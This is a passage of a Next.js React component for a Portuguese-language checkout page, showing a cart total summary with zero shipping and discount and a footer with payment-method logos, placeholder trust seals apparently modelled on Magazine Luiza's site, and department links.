                onClick={() => router.push("/order-confirmation")} // Redireciona para a confirmação do pedido
              >
                Concluir pedido
              </Button>

              <p className="text-center text-sm text-blue-600 underline mt-4">
                <Link href="#">Clique aqui para ler o termo de compra e venda</Link>
              </p>
            </div>

            {/* Order Summary */}
            <div className="lg:col-span-1">
              <Card>
                <CardContent className="p-6 space-y-4">
                  <h2 className="text-lg font-semibold mb-2">Total da sacola</h2>
                  <div className="flex justify-between items-center">
                    <span className="text-sm font-medium">Produtos ({cartItems.length})</span>
                    <span className="text-lg font-bold">
                      {cartItems.length > 0 
                        ? `R$ ${cartItems.reduce((acc, item) => acc + (item.price * item.quantity), 0).toFixed(2).replace(".", ",")}`
                        : "R$ 0,00"
                      }
                    </span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-sm font-medium">Frete</span>
                    <span className="text-lg font-bold">R$ 0,00</span>
                  </div>
                  <div className="flex justify-between items-center border-b pb-2">
                    <span className="text-sm font-medium">Desconto</span>
                    <span className="text-lg font-bold text-red-600">- R$ 0,00</span>
                  </div>
                  <div className="flex justify-between items-center pt-2">
                    <span className="text-lg font-bold">Total da sacola:</span>
                    <span className="text-xl font-bold text-blue-600">
                      {cartItems.length > 0 
                        ? `R$ ${cartItems.reduce((acc, item) => acc + (item.price * item.quantity), 0).toFixed(2).replace(".", ",")}`
                        : "R$ 0,00"
                      }
                    </span>
                  </div>
                </CardContent>
              </Card>
            </div>
          </div>
        )}
      </main>

      {/* Footer */}
      <footer className="bg-blue-600 text-white">
        {/* Formas de pagamento */}
        <div className="py-8">
          <div className="container mx-auto px-4 text-center">
            <h3 className="text-lg font-bold mb-4">Formas de pagamento</h3>
            <div className="flex justify-center gap-4 flex-wrap mb-6">
              {paymentMethods.map((payment, index) => (
                <div key={index} className="w-16 h-10 bg-white rounded flex items-center justify-center p-1">
                  <Image
                    src={payment.src || "/placeholder.svg"}
                    alt={payment.name}
                    width={64}
                    height={40}
                    className="object-contain"
                  />
                </div>
              ))}
            </div>

            {/* Certificados */}
            <div className="flex justify-center gap-8 mb-8">
              <div className="flex items-center gap-2">
                <div className="w-12 h-12 bg-white/20 rounded flex items-center justify-center">🔒</div>
                <div className="text-xs">
                  <div>certificados</div>
                  <div>e segurança</div>
                </div>
              </div>
              <div className="flex items-center gap-2">
                <div className="w-12 h-12 bg-white/20 rounded flex items-center justify-center">⭐</div>
                <div className="text-xs">
                  <div>e-bit</div>
                  <div>A FANTÁSTICA</div>
                  <div>MAGAZINE LUIZA</div>
                </div>
              </div>
              <div className="flex items-center gap-2">
                <div className="w-12 h-12 bg-white/20 rounded flex items-center justify-center">🏆</div>
                <div className="text-xs">
                  <div>Google</div>
                  <div>Customer Reviews</div>
                </div>
              </div>
              <div className="flex items-center gap-2">
                <div className="w-12 h-12 bg-white/20 rounded flex items-center justify-center">🌱</div>
                <div className="text-xs">
                  <div>RA 1000</div>
                  <div>ReclameAQUI</div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Footer Links */}
        <div className="bg-blue-700 py-8">
          <div className="container mx-auto px-4">
            <div className="grid grid-cols-1 md:grid-cols-5 gap-8">
              <div>
                <h4 className="font-bold mb-4">departamentos</h4>
                <ul className="space-y-2 text-sm">
                  <li>
                    <Link href="#" className="hover:underline">
                      casa e construção
                    </Link>
                  </li>
                  <li>
                    <Link href="#" className="hover:underline">
                      artesanato
                    </Link>
                  </li>
                  <li>
                    <Link href="#" className="hover:underline">
                      áudio
                    </Link>
                  </li>
                  <li>
                    <Link href="#" className="hover:underline">
                      automotivo
                    </Link>
                  </li>
                  <li>
                    <Link href="#" className="hover:underline">
                      bebês
                    </Link>
                  </li>
                  <li>
                    <Link href="#" className="hover:underline">
                      beleza e perfumaria
                    </Link>
                  </li>
                  <li>
                    <Link href="#" className="hover:underline">
                      brinquedos
                    </Link>
                  </li>
                  <li>
                    <Link href="#" className="hover:underline">
                      cama, mesa e banho
                    </Link>
                  </li>
                  <li>
                    <Link href="#" className="hover:underline">
                      celulares
                    </Link>
                  </li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </footer>
    </div>
  )
}
